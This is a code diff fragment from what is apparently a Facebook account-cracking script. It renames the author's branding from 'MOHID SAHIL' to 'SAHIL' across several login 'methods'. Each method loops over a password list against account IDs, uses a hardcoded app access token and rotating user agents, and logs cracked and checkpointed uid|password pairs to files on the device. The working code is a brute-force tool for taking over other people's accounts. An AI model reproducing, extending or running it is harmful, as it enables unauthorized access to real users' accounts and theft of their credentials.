-                                        open('/sdcard/MOHID SAHIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [SAHIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SAHIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1469,10 +1469,10 @@ def MOHID SAHIL4(ids,passlist):
         except Exception as e:
                 pass
 #method5
-def MOHID SAHIL5(ids,passlist):
+def SAHIL5(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [SAHIL-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1541,8 +1541,8 @@ def MOHID SAHIL5(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [MOHID SAHIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/MOHID SAHIL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [SAHIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SAHIL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1552,8 +1552,8 @@ def MOHID SAHIL5(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/MOHID SAHIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [SAHIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SAHIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1561,12 +1561,12 @@ def MOHID SAHIL5(ids,passlist):
         except Exception as e:
                 pass
 #method6
-def MOHID SAHIL6(ids,passlist):
+def SAHIL6(ids,passlist):
 	global loop
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [SAHIL-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -1607,10 +1607,10 @@ def MOHID SAHIL6(ids,passlist):
 				if uid in oks:pass
 				else:
 					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [MOHID SAHIL-2F] '+uid+' | '+pas)
+						print('\r\r\033[1;34m [SAHIL-2F] '+uid+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [MOHID SAHIL-OK] '+uid+' | '+pas)
-						open('/sdcard/MOHID SAHIL-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
+						print(f'\r\x1b[1;32m [SAHIL-OK] '+uid+' | '+pas)
+						open('/sdcard/SAHIL-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
@@ -1618,8 +1618,8 @@ def MOHID SAHIL6(ids,passlist):
 				uid=coki[141:156]
 				if uid in cps:pass
 				else:
-					print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+uid+' | '+pas+'\033[1;97m')
-					open('/sdcard/MOHID SAHIL-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SAHIL-CP] '+uid+' | '+pas+'\033[1;97m')
+					open('/sdcard/SAHIL-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
